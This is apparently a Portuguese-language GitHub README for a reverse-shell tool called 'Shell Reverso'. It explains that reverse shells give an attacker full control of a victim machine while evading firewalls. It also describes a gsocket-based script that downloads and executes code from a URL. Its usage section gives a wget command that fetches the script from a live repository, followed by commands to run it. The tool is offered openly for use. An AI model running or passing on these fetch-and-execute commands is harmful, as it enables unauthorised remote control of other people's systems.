# Shell Reverso
![reverse-shell-1024x333](https://github.com/user-attachments/assets/7e5f5e5e-c7c3-4545-a0e9-ea1cfa534438)
Uma shell reversa é uma técnica de ataque onde a máquina vítima se conecta de volta à máquina do atacante, permitindo que o atacante execute comandos remotamente. A vítima geralmente inicia a conexão de saída, que pode passar despercebida por firewalls ou sistemas de segurança, pois é a máquina alvo quem "chama" o atacante. Esse tipo de ataque é utilizado para obter controle total sobre a máquina comprometida.
Este repositório contém um script que estabelece uma shell reversa com gsocket. Quando executado, o script baixa um arquivo de uma URL específica e executa o código, permitindo ao atacante acessar remotamente o sistema da vítima. A saída do script é redirecionada para output.txt,
O Gsocket permite que duas estações de trabalho em diferentes redes privadas se comuniquem entre si. Por meio de firewalls e por meio de NAT - como se não houvesse firewall
## Uso e Instalação
```bash
wget https://raw.githubusercontent.com/Frenninja/Shell-Reverso/refs/heads/main/gsocket.py
python3 gsocket.py
cat output.txt
```

![bandicam 2025-01-09 02-41-57-136](https://github.com/user-attachments/assets/303d977b-71e1-4974-a3ac-7ff91f49096f)
